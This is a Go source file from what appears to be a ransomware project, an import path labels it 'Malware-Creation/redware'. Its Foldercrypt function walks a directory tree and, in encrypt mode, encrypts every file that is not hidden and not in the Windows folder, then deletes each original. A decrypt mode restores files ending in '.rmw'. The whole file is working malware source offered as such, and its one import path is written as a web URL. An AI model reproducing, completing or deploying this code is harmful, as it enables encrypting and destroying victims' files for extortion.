package foldercrypt

import (
	"errors"
	"fmt"
	"io/fs"
	"os"
	"regexp"
	"strings"
	"syscall"

	"github.com/Redhead92/Malware-Creation/tree/main/redware/Block1_Crypt/redcrypt"
)

func check(e error) error {
	if e != nil {
		fmt.Println(e)
		panic(e)
	}
	return nil
}

func IsHidden(filename string) bool{
	pointer , err:= syscall.UTF16PtrFromString(filename)
	check(err)
	hattribute, err := syscall.GetFileAttributes(pointer)
	check(err)
	return hattribute&syscall.FILE_ATTRIBUTE_HIDDEN != 0
}
func Foldercrypt(mode string, iFolder string, key string) {
	// test code, remove switch option from final version

	switch mode {
	// Decryption
	case "D":
		// Folder vars
		var temppath string
		folder := os.DirFS(iFolder)
		// walking system functions
		fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error {
			if errors.Is(err, fs.ErrPermission) || errors.Is(err, fs.ErrNotExist) {
				fmt.Printf("Permission denied for: %v", path)
				return fs.SkipDir
			}
			temppath = iFolder + path
			fmt.Printf("current path: %v\n", temppath)
			fileinfo, err := os.Stat(temppath)
			check(err)

			// skip dirs, files without extension and unencrypted files
			if fileinfo.IsDir() || !strings.Contains(temppath, ".rmw") {

			} else {
				//Decrypt file into plaintext
				redcrypt.Reddecrypt(temppath, key)
				// Delete files permanently
				os.Remove(temppath)
				check(err)
			}
			return nil
		})

	case "E":
		// Folder vars
		var temppath string
		folder := os.DirFS(iFolder)
		// walking system functions
		fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error {
			// Deal with permission errors
			if errors.Is(err, fs.ErrPermission) || errors.Is(err, fs.ErrNotExist) {
				fmt.Printf("current path: %v\n", temppath)
				return fs.SkipDir
			}
			temppath = iFolder + path
			fileinfo, err := os.Stat(temppath)
			check(err)
			// skip top level dirs and skip hidden folders/files (usually system files)
			if fileinfo.IsDir() || IsHidden(temppath){
				//In case of dir check if windows folder (not hidden). if so skip entire folder
				if fileinfo.Name() == "Windows"{
					return fs.SkipDir
				}
			}else {
				// Find folder Walk is currently in with path
				td := regexp.MustCompile(`((.*)\/)`)
				tempdir := string(td.FindString(temppath))
				// Read, Encrypt + generate new encrypted file with RedCrypt function
				redcrypt.Redcrypt(tempdir, key, temppath)
				// Delete files permanently
				os.Remove(temppath)
				check(err)
			}
			return nil
		})

	}
}
